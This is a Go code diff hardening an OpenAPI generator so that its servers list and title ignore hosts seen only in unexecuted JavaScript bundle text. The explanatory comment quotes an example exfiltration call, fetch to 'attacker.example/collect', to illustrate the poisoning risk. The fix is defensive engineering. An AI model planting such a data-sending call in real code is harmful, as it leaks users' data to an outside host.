@@ -119,12 +119,52 @@ func (g *OpenAPIGenerator) APIType() string {
 }
 
 // extractServers extracts unique server URLs from endpoints and returns the server list and title host.
+//
+// SEC-BE-003: servers/titleHost are derived only from DYNAMICALLY OBSERVED
+// endpoints — never from an unprobed JS-static candidate
+// (crawl.IsJSStaticSource). The probe egress gate (pkg/probe) already
+// prevents a cross-origin JS-static candidate from ever being REQUESTED, but
+// without this filter its host could still poison the deliverable: a
+// hostile bundle literal (e.g. fetch("https://attacker.example/collect"))
+// that was never seen on the wire would otherwise be added to `servers`, and
+// could even capture `info.title` by sorting first alphabetically. A benign
+// third-party host (Stripe, analytics, etc.) referenced only in JS source
+// has the same problem non-adversarially.
+//
+// static:html (form-derived candidates, analyze.ExtractForms) is
+// deliberately NOT filtered here: the page carrying the form was itself
+// fetched over the wire during the crawl, unlike a JS-static candidate whose
+// entire existence is reconstructed offline from bundle text that was never
+// executed or requested. This mirrors the codebase's own established
+// distinction — computeSourceTag already treats static:html the same as a
+// real dynamic observation (see its doc comment) rather than as
+// offline-derived — so this filter reuses crawl.IsJSStaticSource, the single
+// canonical definition of "unprobed JS-static", instead of inventing a new
+// predicate.
+//
+// Falls back to the full, unfiltered endpoint set when no dynamically
+// observed endpoint exists, so a fully-offline capture (--analyze-js only,
+// target unreachable) still produces a populated servers list instead of an
+// empty one.
 func extractServers(endpoints []classify.ClassifiedRequest) (openapi3.Servers, string) {
+	observed := make([]classify.ClassifiedRequest, 0, len(endpoints))
+	for _, ep := range endpoints {
+		if !crawl.IsJSStaticSource(ep.Source) {
+			observed = append(observed, ep)
+		}
+	}
+	if len(observed) == 0 {
+		// Fully-offline capture: no dynamically observed host exists, so
+		// fall back to the current (pre-fix) behavior rather than emitting
+		// an empty servers list.
+		observed = endpoints
+	}
+
 	serverSet := make(map[string]bool)
 	var servers openapi3.Servers
 	titleHost := "API"
 
-	for _, endpoint := range endpoints {
+	for _, endpoint := range observed {
 		parsedURL, err := url.Parse(endpoint.URL)
 		if err != nil || (parsedURL.Scheme != "http" && parsedURL.Scheme != "https") {
 			continue
